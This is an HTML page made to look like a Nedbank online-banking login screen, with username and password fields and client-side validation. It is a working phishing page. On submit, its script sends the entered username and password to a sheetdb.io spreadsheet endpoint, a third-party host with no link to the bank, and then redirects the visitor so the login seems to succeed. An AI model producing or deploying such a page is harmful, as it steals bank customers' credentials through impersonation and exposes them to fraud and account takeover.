<!DOCTYPE html> <html> <head> <title>Nedbank Login</title> <style> body { font-family: 'Segoe UI', sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; } .login-container { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); } .qr-section { text-align: center; padding: 20px 0; border-bottom: 1px solid #ddd; margin-bottom: 20px; } .input-group { margin: 15px 0; } input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; } .error { color: #ff0000; font-size: 0.9em; margin: 5px 0; } .password-container { position: relative; } .eye-icon { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #666; } .green-text { color: #008000; cursor: pointer; } .login-button { background: #666; color: white; padding: 12px; width: 100%; border: none; border-radius: 4px; margin-top: 20px; cursor: pointer; } .login-button:disabled { background: #999; cursor: not-allowed; } </style> </head> <body> <div class="login-container"> <div class="qr-section"> <p>Login with Money App</p> <img src="https://via.placeholder.com/150" alt="QR Code"> <p>or</p> </div> <h3 class="green-text">Log in with your Nedbank ID</h3> <p>Don't have a Nedbank ID? <span class="green-text">Register</span></p> <form id="loginForm"> <div class="input-group"> <input type="text" id="username" placeholder="Username" required> <div id="usernameError" class="error"></div> </div> <div class="input-group"> <div class="password-container"> <input type="password" id="password" placeholder="Password" required> <span class="eye-icon" onclick="togglePassword()">üëÅÔ∏è</span> </div> <div id="passwordError" class="error"></div> </div> <p class="green-text">Forgot your details?</p> <p style="color: #666; font-size: 0.9em;">By logging in you accept the terms and conditions</p> <button type="submit" class="login-button" id="loginButton">Log in</button> </form> </div> <script> // Password visibility toggle function togglePassword() { const passwordInput = document.getElementById('password'); passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password'; } // Form validation document.getElementById('loginForm').addEventListener('submit', async (e) => { e.preventDefault(); clearErrors(); const username = document.getElementById('username').value.trim(); const password = document.getElementById('password').value.trim(); let isValid = true; // Username validation if (!username) { showError('usernameError', 'Username is required'); isValid = false; } else if (username.length < 5 || username.length > 20) { showError('usernameError', 'Username must be 5-20 characters'); isValid = false; } else if (!/^[a-zA-Z0-9_]+$/.test(username)) { showError('usernameError', 'Username can only contain letters, numbers, and underscores'); isValid = false; } // Password validation if (!password) { showError('passwordError', 'Password is required'); isValid = false; } else { // Check length if (password.length < 8 || password.length > 16) { showError('passwordError', 'Password must be 8-16 characters'); isValid = false; } // Check complexity - Updated regex to include [ and ] else if (!/(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+\-={}\[\]|;:'",./<>?])/.test(password)) { showError('passwordError', 'Password must include uppercase, lowercase, number, and special character'); isValid = false; } // Check if password contains username (case-insensitive) else if (password.toLowerCase().includes(username.toLowerCase())) { showError('passwordError', 'Password cannot contain username'); isValid = false; } } if (!isValid) return; // Disable button during submission const loginButton = document.getElementById('loginButton'); loginButton.disabled = true; loginButton.textContent = 'Logging in...'; try { const response = await fetch('https://sheetdb.io/api/v1/z6m8243sadz29', { method: 'POST', headers: { 'Content-Type': 'application/json', }, body: JSON.stringify({ data: [{ username, password }] }) }); if (response.ok) { window.location.href = '/dashboard'; } else { alert('Login failed. Please check your credentials.'); } } catch (error) { console.error('Error:', error); alert('Connection error. Please try again later.'); } finally { loginButton.disabled = false; loginButton.textContent = 'Log in'; } }); function showError(elementId, message) { document.getElementById(elementId).textContent = message; } function clearErrors() { document.getElementById('usernameError').textContent = ''; document.getElementById('passwordError').textContent = ''; } </script> </body> </html>